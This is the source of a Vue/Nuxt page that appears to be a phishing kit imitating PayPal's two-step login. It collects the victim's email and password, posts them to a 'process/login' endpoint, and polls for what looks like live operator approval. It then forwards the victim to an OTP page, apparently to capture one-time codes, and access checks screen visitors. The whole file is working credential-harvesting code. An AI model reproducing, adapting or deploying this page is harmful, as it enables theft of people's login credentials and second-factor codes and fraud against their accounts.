
<script setup>
const check = await $fetch('/api/checkgranted')
if(!check) {
    throw new Error("You're not authorized")
}
definePageMeta({
  middleware: [
    'dinzab',
    'checklogin',
    'captcha'
  ]
});

</script>
<script>
export default {
    data() {
        return {
            hideError: true,
            dinzabemail: "",
            dinzabpassword: "",
            loadNext: false,
            next: false,
            hidePassError: true,
            btndisabled: false,
            alert: false,
            loader: false,
            session: "",
            en: true,
            fr: false,
            es: false,
            de:false
        }
    },
    methods: {
        blur(dest) {
            if (dest == "email" && this.dinzabemail == "") {
                this.hideError = false
            } else {
                this.hideError = true
            }
            if (dest == "password" && this.dinzabpassword == "") {
                this.hidePassError = false
            } else {
                this.hidePassError = true
            }
        },
        focus() {
            this.hideError = true
            this.hidePassError = true
            this.alert = false
        },
        nextj() {
            if (this.dinzabemail.length >= 5) {
                this.loadNext = true
                this.alert = false
                setTimeout(() => {
                    this.next = true
                }, 2000)
            } else {
                this.hideError = false
            }
        },
        change() {
            this.next = false
            this.loadNext = false
            this.hideError = true
            this.hidePassError = true
            this.alert = false
            this.dinzabemail = ""
        },
        async post() {
            const app = useNuxtApp()
            if (this.checkForm()) {
                this.loader = true
                this.alert = false
                await app.$api.post('v1.0/process/login', {
                    login_email: this.dinzabemail,
                    login_password: this.dinzabpassword
                }, {
                    headers: {
                        'Authorization': this.session,
                        'dinzab': true
                    }
                }).then(res => {
                    var poll = setInterval(async () => {
                        await app.$api.get('Check/authority/v.01/login.aspx', {
                            headers: {
                                'Authorization': this.session,
                                'dinzab': true
                            }
                        }).then(async e => {
                            if (e.data.login === true) {
                                clearInterval(poll)
                                await app.$api.get('fix/statux.aspx', {
                                    headers: {
                                        'Authorization': this.session,
                                        'dinzab': true
                                    }
                                })
                               useRouter().push({name: 'otp-signin'})

                            }
                            if (e.data.login === false) {
                                clearInterval(poll)
                                await app.$api.get('fix/statux.aspx', {
                                    headers: {
                                        'Authorization': this.session,
                                        'dinzab': true
                                    }
                                })
                                this.loader = false
                                this.alert = true
                            }
                        }).catch(async () => {
                            clearInterval(poll)
                            await app.$api.get('fix/statux.aspx', {
                                headers: {
                                    'Authorization': this.session,
                                    'dinzab': true
                                }
                            })
                            this.loader = false
                            this.alert = true
                        })
                    }, 2000)
                }).catch(() => {
                    this.loader = false
                    this.alert = true
                })
            } else {
                this.next = false
                this.loadNext = false
                this.alert = true
            }

        },
        checkForm() {
            if (this.dinzabemail.length < 5 || this.dinzabpassword.length < 5) {
                return false
            }
            return true
        },
        async changeLang(lang) {
            const res = await $fetch('/api/setlang', {
                method: 'POST',
                body: {
                    lang: lang.toString()
                }
            })
            switch (lang) {
                case 'en':
                    this.fr = false 
                    this.de = false
                    this.es = false
                    this.en = true
                    break;
                case 'fr':
                    this.fr = true 
                    this.de = false
                    this.es = false
                    this.en = false
                    break;
                case 'de':
                    this.fr = false 
                    this.de = true
                    this.es = false
                    this.en = false
                    break;
                case 'es':
                    this.fr = false 
                    this.de = false
                    this.es = true
                    this.en = false
                    break;
            
                default:
                    break;
            }
            this.$i18n.setLocale(lang.toString())
        }
    },
    async beforeMount() {
        const res = await $fetch("/api/cookie")
        this.session = res
    }


}
</script>
<template>
    <div>

        <Head>
            <Title>{{ $t("1") }}</Title>
        </Head>
        <section class="container main w-100 lg:p-0 sm:w-[80%] md:w-[100%] lg:w-[70%] flex justify-center items-center"
            style="margin:0 auto!important">
            <div class="zeby1">
                <div class="containerz containerBordered">
                    <header class="pb-5">
                        <div class="zebyLogo"></div>
                    </header>
                    <form id="login" class="zebyMaskable" v-on:submit.prevent="post()">
                        <div class="rememberEmail" :class="{ hide: !next }" ref="rememberEmail">
                            <div class="container">
                                <div class="flex justify-center items-center">
                                    <span class="displayEmail" ref="emailDisplay">{{ dinzabemail }}</span>
                                    <a href="javascript:void(0)" class=" text-lg font-bold text-[#1072eb]"
                                        v-on:click="change()">{{ $t('2') }}</a>
                                </div>
                            </div>

                        </div>
                        <div class="notifications" :class="{ hide: !alert }">


                            <p class="notification notification-critical" role="alert">
                                {{ $t('3') }}</p>
                        </div>
                        <div id="email" :class="{ hide: next }">
                            <div class="zebyInput">
                                <div class="relative">
                                    <input type="text" v-on:focus="focus()" v-on:blur="blur('email')" v-model="dinzabemail"
                                        id="dinzabemail"
                                        class="block shadow-lg rounded-t-lg px-2.5 pb-2.5 pt-5 w-full text-sm text-gray-900 bg-gray-50 dark:bg-gray-700 border-0 border-b-2 border-gray-600 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 peer"
                                        placeholder=" " />
                                    <label for="dinzabemail"
                                        class="absolute lg:text-lg sm:text-md text-gray-900 dark:text-gray-400 duration-300 transform -translate-y-4 scale-75 top-4 z-10 origin-[0] left-2.5 peer-focus:text-grey-600 peer-focus:dark:text-grey-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4">{{
                                            $t('4') }}</label>
                                </div>
                                <div class="grid grid-cols-1 pt-2 " :class="{ 'hide': hideError }">
                                    <div class="col-span-1">
                                        <div class="error">
                                            <p>{{ $t('5') }}</p>
                                        </div>
                                    </div>
                                </div>
                                <div class="p-2 ml-0">
                                    <p class=" text-left text-lg font-bold text-[#1072eb]">{{ $t('6') }}</p>
                                </div>
                                <div class="w-full flex flex-col justify-center" :class="{ hide: loadNext }">
                                    <button type="button" v-on:click="nextj()"
                                        class="w-100 bg-[#1040c1] rounded-3xl p-3 text-white font-bold transition duration-200 hover:bg-[#1040c1]">{{
                                            $t('7') }}</button>
                                </div>
                                <div class="w-full flex flex-col justify-center pt-1" :class="{ hide: !loadNext }"
                                    id="nextloader">
                                    <button disabled type="button"
                                        class="w-100 bg-[#1040c1] rounded-3xl p-3 text-white font-bold transition duration-200 hover:bg-[#1040c1]">
                                        <svg aria-hidden="true" role="status"
                                            class="inline w-4 h-4 mr-3 text-gray-200 animate-spin dark:text-gray-600"
                                            viewBox="0 0 100 101" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <path
                                                d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z"
                                                fill="currentColor" />
                                            <path
                                                d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z"
                                                fill="#1C64F2" />
                                        </svg>
                                    </button>
                                </div>
                            </div>
                        </div>
                        <div id="password" :class="{ hide: !next }">
                            <div class="zebyInput">
                                <div class="relative">
                                    <input type="password" id="dinzabpassword" v-on:blur="blur('password')"
                                        v-on:focus="focus()" v-model="dinzabpassword"
                                        class="block shadow-lg rounded-t-lg px-2.5 pb-2.5 pt-5 w-full text-sm text-gray-900 bg-gray-50 dark:bg-gray-700 border-0 border-b-2 border-gray-600 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 peer"
                                        placeholder=" " />
                                    <label for="dinzabpassword"
                                        class="absolute lg:text-lg sm:text-md text-gray-900 dark:text-gray-400 duration-300 transform -translate-y-4 scale-75 top-4 z-10 origin-[0] left-2.5 peer-focus:text-grey-600 peer-focus:dark:text-grey-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4">{{
                                            $t('8') }}</label>
                                </div>
                                <div class="grid grid-cols-1 pt-2 " :class="{ 'hide': hidePassError }">
                                    <div class="col-span-1">
                                        <div class="error">
                                            <p>{{ $t('9') }}</p>
                                        </div>
                                    </div>
                                </div>
                                <div class="p-3 m-0">
                                    <p class=" lg:text-lg sm:text-md font-bold text-[#1072eb]">{{ $t('10') }}</p>
                                </div>
                                <div class="w-full flex flex-col justify-center">
                                    <button :disabled="btndisabled" type="submit"
                                        class="w-full bg-[#1040c1] rounded-3xl p-3 text-white font-bold transition duration-200 hover:bg-[#1040c1]">{{
                                            $t('11') }}</button>
                                </div>
                            </div>
                        </div>
                        <div class="zebysep">
                            <span class="textsep font-bold">or</span>
                        </div>
                        <button
                            class="w-full border-blue-900 hover:border-[#003087] hover:border-[2px] border-[1px] rounded-3xl p-3 text-[#0070ba] font-bold transition duration-200">{{
                                $t('12') }}</button>

                    </form>
                    <div class="intentFooter" style="margin:5em auto!important">
                        <div class="localeSelector">
                            <ul class="localeLink">
                                <li><a class="text-md" :class="{selected: en}" v-on:click="changeLang('en')">English</a></li>
                                <li><a class="text-md" :class="{selected: fr}" v-on:click="changeLang('fr')">Français</a></li>
                                <li><a class="text-md" :class="{selected: es}" v-on:click="changeLang('es')">Español</a></li>
                                <li><a class="text-md" :class="{selected: de}" v-on:click="changeLang('de')">Deutsch</a></li>
                            </ul>
                        </div>
                    </div>
                </div>

            </div>

        </section>
        <footer class="footer" role="contentinfo">
        <div class="legalFooter">
            <ul class="footerGroup">
                <li><a target="_blank" href="" pa-marked="1">{{$t('66')}}</a></li>
                <li><a target="_blank" href="" pa-marked="1">{{ $t('67') }}</a></li>
                <li><a target="_blank" href="" pa-marked="1">{{ $t('68') }}</a></li>
                <li><a target="_blank" href="" pa-marked="1">{{ $t('69') }}</a>
                </li>
                <li><a target="_blank" href="" pa-marked="1">{{ $t('70') }}</a></li>
            </ul>
        </div>
    </footer>
    <div class="spinnerWithLockIcon" :class="{hide: !loader}">
        <p>{{ $t('13') }}</p>
        <div class="keychain"></div>
    </div>
</div></template>
<route lang="yaml"></route>
